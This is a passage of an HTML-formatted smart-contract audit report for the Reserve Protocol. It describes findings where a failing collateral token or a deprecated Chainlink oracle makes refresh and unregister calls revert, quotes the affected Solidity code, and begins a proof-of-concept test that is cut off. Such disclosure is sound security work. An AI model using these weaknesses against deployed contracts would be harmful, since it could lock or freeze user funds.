9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Referring to <a href=\"https://eips.ethereum.org/EIPS/eip-4626\">eip-4626</a>, distribute rewards based on time weighted shares.</p>\n<p>Alternatively, always use a very small rewardPeriod and rewardRatio, and lower the upper limit <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L15-L16\">MAX<em>RATIO and MAX</em>PERIOD</a>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/258\">0xean (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/258#issuecomment-1404414135\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Agreed with the warden. And agree this is a Medium severity issue.</p>\n<p>(aside: we are already planning to fix the period at 12s to mitigate this issue)</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/258#issuecomment-1421613758\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Addressed here: <a href=\"https://github.com/reserve-protocol/protocol/pull/571\">https://github.com/reserve-protocol/protocol/pull/571</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/9\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/60\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/39\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-16-rtoken-permanently-insolventunusable-if-a-single-collateral-in-the-basket-behaves-unexpectedly\" style=\"position:relative;\"><a href=\"#m-16-rtoken-permanently-insolventunusable-if-a-single-collateral-in-the-basket-behaves-unexpectedly\" aria-label=\"m 16 rtoken permanently insolventunusable if a single collateral in the basket behaves unexpectedly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/254\">[M-16] RToken permanently insolvent/unusable if a single collateral in the basket behaves unexpectedly</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/254\">0xdeadbeef0x</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/345\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/183\">severity</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/133\">severity</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/132\">severity</a>, and <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/129\">severity</a></em></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L45\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L45</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L37\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L37</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L50\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L50</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L300\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L300</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L87\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L87</a></p>\n<p>Asset plugins assume underlying collateral tokens will always behave as they are expected at the time of the plugin creation. This assumption can be incorrect because of multiple reasons such as upgrades/rug pulls/hacks.</p>\n<p>In case a single collateral token in a basket of assets causes functions in the asset to fail the whole RToken functionality will be broken.</p>\n<p>This includes (and not limited to):</p>\n<ol>\n<li>Users cannot redeem RTokens for any collateral</li>\n<li>Users cannot issue RTokens</li>\n<li>Bad collateral token cannot be unregistered</li>\n<li>Stakers will not be able to unstake</li>\n<li>Recollateralization will not be possible</li>\n<li>Basket cannot be updated</li>\n</ol>\n<p>The impacts become permanent as the unregistering of bad collateral assets is also dependent on collateral token behavior.</p>\n<p>Emphasis of funds lost:<br></p>\n<ul>\n<li>A basket holds 2 collateral assets [cAssetA, cAssetB] where cAssetA holds 1% of the RToken collateral and cAssetB holds 99%.</li>\n<li>cAssetA gets hacked and self-destructed. This means it will revert on any interaction with it.</li>\n<li>Even though 99% of funds still exists in cAssetB. They will be permanently locked and RToken will be unusable.</li>\n</ul>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Lets assume a <code>CTokenFiatCollateral</code> of <code>cUSDP</code> is registered as an asset in <code>AssetRegistry</code>.</p>\n<p>One day, <code>cUSDP</code> deployer gets hacked and the contract self-destructs, therefore any call to the <code>cUSDP</code> contract will fail.<br>\n<code>cUSDP</code> is a proxy contract:<br>\n<a href=\"https://etherscan.io/address/0x041171993284df560249B57358F931D9eB7b925D#readProxyContract\">https://etherscan.io/address/0x041171993284df560249B57358F931D9eB7b925D#readProxyContract</a></p>\n<p>Note: There could be other reasons that calls to <code>cUSDP</code> will revert such as:</p>\n<ol>\n<li>Upgrade to implementation to change/deprecate functions</li>\n<li>Freezing of contract for a long duration of time (due to patching)</li>\n<li>blacklisting/whitelisitng callers.</li>\n</ol>\n<p><strong>Bad collateral assets cannot be unregistered</strong></p>\n<p>Lets describe the flow of unregistering an asset from the <code>AssetRegistry</code>:</p>\n<p><code>governance</code> needs to call <code>unregister</code> in order to unregister and asset:<br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L87\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L87</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function unregister(IAsset asset) external governance {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(_erc20s.contains(address(asset.erc20())), &quot;no asset to unregister&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(assets[asset.erc20()] == asset, &quot;asset not found&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint192 quantity = basketHandler.quantity(asset.erc20());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _erc20s.remove(address(asset.erc20()));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assets[asset.erc20()] = IAsset(address(0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit AssetUnregistered(asset.erc20(), asset);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (quantity &gt; 0) basketHandler.disableBasket();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As can seen above, <code>basketHandler.quantity(asset.erc20());</code> is called as part of the unregister flow.</p>\n<p><code>quantity</code> function in <code>basketHandler</code>:<br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L300\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L300</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function quantity(IERC20 erc20) public view returns (uint192) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        try assetRegistry.toColl(erc20) returns (ICollateral coll) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (coll.status() == CollateralStatus.DISABLED) return FIX_ZERO;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint192 refPerTok = coll.refPerTok(); // {ref/tok}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (refPerTok &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                // {tok/BU} = {ref/BU} / {ref/tok}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                return basket.refAmts[erc20].div(refPerTok, CEIL);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                return FIX_MAX;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } catch {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return FIX_ZERO;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>The asset is still registered so the <code>try</code> call will succeed and <code>coll.refPerTok();</code> will be called.</p>\n<p><code>refPerTok</code> function in <code>CTokenFiatCollateral</code> (which is used as an asset of <code>cUSDP</code>):<br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L45\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L45</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function refPerTok() public view override returns (uint192) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 rate = ICToken(address(erc20)).exchangeRateStored();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        int8 shiftLeft = 8 - int8(referenceERC20Decimals) - 18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return shiftl_toFix(rate, shiftLeft);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>If <code>ICToken(address(erc20)).exchangeRateStored();</code> will revert because of the previously defined reasons (hack, upgrade, etc..), the whole <code>unregister</code> call will be a reverted.</p>\n<p><strong>Explanation of Impact</strong></p>\n<p>As long as the asset is registered and cannot be removed (explained above), many function calls will revert and cause the impacts in the <code>impact</code> section.</p>\n<p>The main reason is the <code>refresh</code> function of <code>CTokenFiatCollateral</code> (used for <code>cUSDP</code>) depends on a call to <code>cUSDP</code> <code>exchangeRateCurrent</code> function.<br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L37\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L37</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function refresh() public virtual override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // == Refresh ==</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Update the Compound Protocol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ICToken(address(erc20)).exchangeRateCurrent();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Intentional and correct for the super call to be last!</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        super.refresh(); // already handles all necessary default checks</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><code>AssetRegistry</code>s <code>refresh</code> function calls refresh to all registered assets:<br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L50\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L50</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function refresh() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // It&#39;s a waste of gas to require notPausedOrFrozen because assets can be updated directly</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 length = _erc20s.length();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i = 0; i &lt; length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            assets[IERC20(_erc20s.at(i))].refresh();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>In our case, <code>CTokenFiatCollateral.refresh()</code> will revert therefore the call to <code>AssetRegistry.refresh()</code> will revert.</p>\n<p><code>AssetRegistry.refresh()</code> is called in critical functions that will revert:</p>\n<ol>\n<li><code>_manageTokens</code> - used manage backing policy, handout excess assets and perform recollateralization\n(<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L107\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L107</a>)</li>\n<li><code>refreshBucket</code> - used to switch the basket configuration\n(<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L184\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L184</a>)</li>\n<li><code>issue</code> - used to issue RTokens to depositors\n(<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L194\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L194</a>)</li>\n<li><code>vest</code> - used to vest issuance of an account\n(<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L380\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L380</a>)</li>\n<li><code>redeem</code> - used to redeem collateral assets for RTokens\n(<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L443\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L443</a>)</li>\n<li><code>poke</code> - in main, used as a refresher\n(<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Main.sol#L45\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Main.sol#L45</a>)</li>\n<li><code>withdraw</code> in RSR, stakers will not be able to unstake\n(<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L302\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L302</a>)</li>\n</ol>\n<h3 id=\"tools-used-9\" style=\"position:relative;\"><a href=\"#tools-used-9\" aria-label=\"tools used 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry, VS Code</p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>For plugins to function as intended there has to be a dependency on protocol specific function.</p>\n<p>In a case that the collateral token is corrupted, the governance should be able to replace to corrupted token. The unregistering flow should never be depended on the token functionality.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/254#issuecomment-1400504728\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Downgrading to Medium and leaving open to sponsor review. There are externalities here that do no qualify the issue as High.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/254#issuecomment-1404418850\">tbrent (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Nice find!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR makes the AssetRegistry more resilient to bad collateral during asset unregistration, and disables staking when frozen.<br>\n<a href=\"https://github.com/reserve-protocol/protocol/pull/623\">reserve-protocol/protocol#623</a></p>\n</blockquote>\n<p><strong>Status:</strong> Not fully mitigated. Full details in <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73\">report from AkshaySrivastav</a>, and also included in Mitigation Review section below.</p>\n<hr>\n<h2 id=\"m-17-refresh-will-revert-on-oracle-deprecation-effectively-disabling-part-of-the-protocol\" style=\"position:relative;\"><a href=\"#m-17-refresh-will-revert-on-oracle-deprecation-effectively-disabling-part-of-the-protocol\" aria-label=\"m 17 refresh will revert on oracle deprecation effectively disabling part of the protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/234\">[M-17] <code>refresh()</code> will revert on Oracle deprecation, effectively disabling part of the protocol</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/234\">0xA5DF</a></em></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/Asset.sol#L102\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/Asset.sol#L102</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/FiatCollateral.sol#L149\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/FiatCollateral.sol#L149</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/OracleLib.sol#L14-L31\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/OracleLib.sol#L14-L31</a></p>\n<p>The <code>Asset.refresh()</code> function calls <code>tryPrice()</code> and catches all errors except errors with empty data.</p>\n<p>As explained in the <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/docs/solidity-style.md#catching-empty-data\">docs</a> the reason empty errors aren’t caught is in order to prevent an attacker from failing the <code>tryPrice()</code> intentionally by running it out of gas.</p>\n<p>However, an error with empty data isn’t thrown only in case of out of gas, in the current way that Chainlink deprecates oracles (by setting <code>aggregator</code> to the zero address) a deprecated oracle would also throw an empty error.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Any function that requires refreshing the assets will fail to execute (till the asset is replaced in the asset registry, passing the proposal via governance would usually take 7 days), that includes:</p>\n<ul>\n<li>Issuance</li>\n<li>Vesting</li>\n<li>Redemption</li>\n<li>Auctions (<code>manageTokens()</code>)</li>\n<li><code>StRSR.withdraw()</code></li>\n</ul>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <a href=\"https://github.com/reserve-protocol/protocol/blob/d224c14c398d2727d39d133aa7511e1e6b161833/docs/recollateralization.md#:~:text=If%20an%20asset%27s%20oracle%20goes%20offline%20forever%2C%20its%20lotPrice()%20will%20eventually%20reach%20%5B0%2C%200%5D%20and%20the%20protocol%20will%20completely%20stop%20trading%20this%20asset.\">docs</a> imply in case of deprecation the protocol is expected continue to operate:</p>\n<blockquote>\n<p>If an asset’s oracle goes offline forever, its lotPrice() will eventually reach [0, 0] and the protocol will completely stop trading this asset.</p>\n</blockquote>\n<p>The <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/docs/collateral.md#refresh-should-never-revert\">docs</a> also clearly state that ’<code>refresh()</code> should never revert’</p>\n<p>I’ve tracked a few Chainlink oracles that were deprecated on the Polygon network on Jan 11, the PoC below tests an <code>Asset.refresh()</code> call with a deprecated oracle.</p>\n<p>File: <code>test/plugins/Deprecated.test.ts</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">Wallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ContractFactory</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;ethers&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">, </span><span class=\"mtk12\">network</span><span class=\"mtk1\">, </span><span class=\"mtk12\">waffle</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;hardhat&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">IConfig</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../../common/configuration&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">bn</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fp</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../../common/numbers&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">Asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span 